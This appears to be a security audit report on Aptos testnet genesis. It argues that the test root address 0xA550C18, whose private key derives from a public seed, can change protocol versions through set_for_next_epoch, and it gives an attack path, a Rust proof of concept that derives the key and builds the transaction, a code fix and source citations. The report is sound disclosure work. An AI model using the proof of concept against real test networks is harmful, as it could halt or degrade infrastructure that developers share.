# Audit Report

## Title
Test Root Address Privileges in Testnet Genesis - Insufficient Isolation for Public Test Networks

## Summary
The `aptos_test_root_address()` function returns a well-known address (`0xA550C18`) whose private key is deterministically generated from a public seed. When networks are deployed with `is_test: true`, this address receives privileged capabilities including `SetVersionCapability`, allowing anyone who knows the seed to manipulate protocol versions on testnets and devnets.

## Finding Description
The vulnerability exists in the genesis initialization flow when `is_test: true`: [1](#0-0) [2](#0-1) 

The test root address `0xA550C18` corresponds to `@core_resources` in the Move framework. The keypair for this address is generated from a well-known seed: [3](#0-2) [4](#0-3) 

During genesis with `is_test: true`, the system grants version control privileges: [5](#0-4) [6](#0-5) [7](#0-6) 

The critical issue: `set_for_next_epoch` can be called post-genesis without restrictions: [8](#0-7) 

Unlike `set_version`, this function lacks the `chain_status::assert_genesis()` check, allowing usage after chain initialization.

**Attack Path:**
1. Attacker derives private key: `Ed25519PrivateKey::generate(&mut StdRng::from_seed([42; 32]))`
2. Attacker crafts transaction calling `0x1::version::set_for_next_epoch` with arbitrary version
3. Transaction is signed with the derived private key for `0xA550C18`
4. Testnet/devnet accepts transaction and queues protocol version change
5. Next epoch activates incompatible or malicious version

**Affected Networks:** [9](#0-8) 

## Impact Explanation
**HIGH Severity** - Testnet/devnet protocol manipulation causing:
- **Validator node slowdowns**: Incompatible versions can cause consensus degradation
- **Network availability loss**: Setting invalid versions can halt block production  
- **Significant protocol violations**: Bypasses governance mechanisms for version updates

While mainnet is protected by hardcoded `is_test: false`: [10](#0-9) [11](#0-10) 

Public testnets and devnets used by developers are vulnerable. This violates **Access Control invariant #8**: system addresses must be protected, as the well-known key compromises `@core_resources`.

## Likelihood Explanation
**MEDIUM-HIGH Likelihood** for public testnets:
- Seed is publicly available in source code
- No authentication beyond possession of well-known key
- Testnet is accessible to external users per configuration
- Default genesis configuration enables vulnerability
- Attack requires minimal sophistication (standard transaction submission)

## Recommendation
**Immediate Mitigation:**
1. Remove `set_for_next_epoch` access from test root address or add `chain_status::assert_genesis()` check
2. Document the well-known key exposure for testnet operators
3. Consider using per-deployment random keys for test networks instead of deterministic seed

**Code Fix - version.move:**
```move
public entry fun set_for_next_epoch(account: &signer, major: u64) acquires Version {
    assert!(exists<SetVersionCapability>(signer::address_of(account)), error::permission_denied(ENOT_AUTHORIZED));
    chain_status::assert_genesis(); // Add this check
    let old_major = borrow_global<Version>(@aptos_framework).major;
    assert!(old_major < major, error::invalid_argument(EINVALID_MAJOR_VERSION_NUMBER));
    config_buffer::upsert(Version {major});
}
```

**Alternative - vm-genesis/src/lib.rs:**
Do not call `allow_core_resources_to_set_version` even in test mode, or restrict it to chain_id == TESTING (4) only.

## Proof of Concept
```rust
use aptos_crypto::{ed25519::Ed25519PrivateKey, PrivateKey, Uniform};
use aptos_types::account_address::AccountAddress;
use aptos_types::transaction::{Script, TransactionPayload};
use rand::SeedableRng;
use rand::rngs::StdRng;

// Generate the well-known keypair
let seed = [42u8; 32];
let mut rng = StdRng::from_seed(seed);
let private_key = Ed25519PrivateKey::generate(&mut rng);
let public_key = private_key.public_key();

// Verify address matches
let address = AccountAddress::from_hex_literal("0xA550C18").unwrap();
assert_eq!(aptos_types::transaction::authenticator::AuthenticationKey::ed25519(&public_key).derived_address(), address);

// Create transaction calling version::set_for_next_epoch
let payload = TransactionPayload::EntryFunction(
    aptos_types::transaction::EntryFunction::new(
        aptos_types::move_utils::MemberId {
            module_id: ModuleId::new(AccountAddress::ONE, Identifier::new("version").unwrap()),
            member_id: Identifier::new("set_for_next_epoch").unwrap(),
        },
        vec![],
        vec![bcs::to_bytes(&999u64).unwrap()], // Arbitrary malicious version
    )
);

// Sign with well-known key and submit to testnet
// Result: Protocol version changed without authorization
```

**Notes:**
- Mainnet isolation IS proper due to explicit safeguards
- Issue affects **testnets/devnets** deployed with default configuration  
- Consider this a **test environment security issue** rather than mainnet vulnerability
- Severity depends on whether public testnets are considered "production-like" infrastructure

### Citations

**File:** types/src/account_config/constants/addresses.rs (L7-10)
```rust
pub fn aptos_test_root_address() -> AccountAddress {
    AccountAddress::from_hex_literal("0xA550C18")
        .expect("Parsing valid hex literal should always succeed")
}
```

**File:** aptos-move/framework/src/aptos.rs (L198-198)
```rust
    let resources = NumericalAddress::parse_str("0xA550C18").unwrap();
```

**File:** aptos-move/vm-genesis/src/lib.rs (L77-77)
```rust
const GENESIS_SEED: [u8; 32] = [42; 32];
```

**File:** aptos-move/vm-genesis/src/lib.rs (L120-125)
```rust
pub static GENESIS_KEYPAIR: Lazy<(Ed25519PrivateKey, Ed25519PublicKey)> = Lazy::new(|| {
    let mut rng = StdRng::from_seed(GENESIS_SEED);
    let private_key = Ed25519PrivateKey::generate(&mut rng);
    let public_key = private_key.public_key();
    (private_key, public_key)
});
```

**File:** aptos-move/vm-genesis/src/lib.rs (L143-143)
```rust
    assert!(!genesis_config.is_test, "This is mainnet!");
```

**File:** aptos-move/vm-genesis/src/lib.rs (L351-352)
```rust
    if genesis_config.is_test {
        allow_core_resources_to_set_version(&mut session, &module_storage, &mut traversal_context);
```

**File:** aptos-move/vm-genesis/src/lib.rs (L1088-1101)
```rust
fn allow_core_resources_to_set_version(
    session: &mut SessionExt<impl AptosMoveResolver>,
    module_storage: &impl AptosModuleStorage,
    traversal_context: &mut TraversalContext,
) {
    exec_function(
        session,
        module_storage,
        traversal_context,
        VERSION_MODULE_NAME,
        "initialize_for_test",
        vec![],
        serialize_values(&vec![MoveValue::Signer(aptos_test_root_address())]),
    );
```

**File:** aptos-move/framework/aptos-framework/sources/configs/version.move (L59-64)
```text
    public entry fun set_for_next_epoch(account: &signer, major: u64) acquires Version {
        assert!(exists<SetVersionCapability>(signer::address_of(account)), error::permission_denied(ENOT_AUTHORIZED));
        let old_major = borrow_global<Version>(@aptos_framework).major;
        assert!(old_major < major, error::invalid_argument(EINVALID_MAJOR_VERSION_NUMBER));
        config_buffer::upsert(Version {major});
    }
```

**File:** aptos-move/framework/aptos-framework/sources/configs/version.move (L81-84)
```text
    fun initialize_for_test(core_resources: &signer) {
        system_addresses::assert_core_resource(core_resources);
        move_to(core_resources, SetVersionCapability {});
    }
```

**File:** terraform/helm/genesis/values.yaml (L9-13)
```yaml
  chain_id: 4
  # -- If true, genesis will create a resources account that can mint coins.
  is_test: true
  # -- If specified, the key for the minting capability in testnet
  root_key: "0x5243ca72b0766d9e9cbf2debf6153443b01a1e0e6d086c7ea206eaf6f8043956"
```

**File:** crates/aptos-genesis/src/mainnet.rs (L131-131)
```rust
                is_test: false,
```
